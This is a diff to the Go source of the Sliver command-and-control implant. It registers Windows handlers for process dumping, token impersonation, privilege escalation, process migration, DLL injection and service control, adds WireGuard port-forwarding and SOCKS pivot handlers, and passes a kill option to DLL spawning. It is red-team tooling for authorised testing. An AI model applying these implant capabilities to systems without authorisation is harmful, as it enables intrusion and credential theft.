@@ -45,21 +45,21 @@ var (
 	windowsHandlers = map[uint32]RPCHandler{
 
 		// Windows Only
-		sliverpb.MsgTaskReq:            taskHandler,
-		sliverpb.MsgProcessDumpReq:     dumpHandler,
-		sliverpb.MsgImpersonateReq:     impersonateHandler,
-		sliverpb.MsgRevToSelfReq:       revToSelfHandler,
-		sliverpb.MsgRunAsReq:           runAsHandler,
-		sliverpb.MsgInvokeGetSystemReq: getsystemHandler,
-		sliverpb.MsgExecuteAssemblyReq: executeAssemblyHandler,
-		sliverpb.MsgInvokeMigrateReq:   migrateHandler,
-		sliverpb.MsgSpawnDllReq:        spawnDllHandler,
-		sliverpb.MsgStartServiceReq:    startService,
-		sliverpb.MsgStopServiceReq:     stopService,
-		sliverpb.MsgRemoveServiceReq:   removeService,
-		sliverpb.MsgEnvReq:             getEnvHandler,
-		sliverpb.MsgSetEnvReq:          setEnvHandler,
-		sliverpb.MsgExecuteTokenReq:    executeTokenHandler,
+		sliverpb.MsgTaskReq:                  taskHandler,
+		sliverpb.MsgProcessDumpReq:           dumpHandler,
+		sliverpb.MsgImpersonateReq:           impersonateHandler,
+		sliverpb.MsgRevToSelfReq:             revToSelfHandler,
+		sliverpb.MsgRunAsReq:                 runAsHandler,
+		sliverpb.MsgInvokeGetSystemReq:       getsystemHandler,
+		sliverpb.MsgInvokeExecuteAssemblyReq: executeAssemblyHandler,
+		sliverpb.MsgInvokeMigrateReq:         migrateHandler,
+		sliverpb.MsgSpawnDllReq:              spawnDllHandler,
+		sliverpb.MsgStartServiceReq:          startService,
+		sliverpb.MsgStopServiceReq:           stopService,
+		sliverpb.MsgRemoveServiceReq:         removeService,
+		sliverpb.MsgEnvReq:                   getEnvHandler,
+		sliverpb.MsgSetEnvReq:                setEnvHandler,
+		sliverpb.MsgExecuteTokenReq:          executeTokenHandler,
 
 		// Platform specific
 		sliverpb.MsgIfconfigReq:          ifconfigHandler,
@@ -83,6 +83,15 @@ var (
 		sliverpb.MsgRmReq:       rmHandler,
 		sliverpb.MsgMkdirReq:    mkdirHandler,
 		sliverpb.MsgExecuteReq:  executeHandler,
+		// {{if .Config.WGc2Enabled}}
+		// Wireguard specific
+		sliverpb.MsgWGStartPortFwdReq:   wgStartPortfwdHandler,
+		sliverpb.MsgWGStopPortFwdReq:    wgStopPortfwdHandler,
+		sliverpb.MsgWGListForwardersReq: wgListTCPForwardersHandler,
+		sliverpb.MsgWGStartSocksReq:     wgStartSocksHandler,
+		sliverpb.MsgWGStopSocksReq:      wgStopSocksHandler,
+		sliverpb.MsgWGListSocksReq:      wgListSocksServersHandler,
+		// {{end}}
 	}
 
 	windowsPivotHandlers = map[uint32]PivotHandler{
@@ -291,7 +300,7 @@ func spawnDllHandler(data []byte, resp RPCResponse) {
 	//{{if .Config.Debug}}
 	log.Printf("ProcName: %s\tOffset:%x\tArgs:%s\n", spawnReq.GetProcessName(), spawnReq.GetOffset(), spawnReq.GetArgs())
 	//{{end}}
-	result, err := taskrunner.SpawnDll(spawnReq.GetProcessName(), spawnReq.GetData(), spawnReq.GetOffset(), spawnReq.GetArgs())
+	result, err := taskrunner.SpawnDll(spawnReq.GetProcessName(), spawnReq.GetData(), spawnReq.GetOffset(), spawnReq.GetArgs(), spawnReq.Kill)
 	spawnResp := &sliverpb.SpawnDll{Result: result}
 	if err != nil {
 		spawnResp.Response = &commonpb.Response{
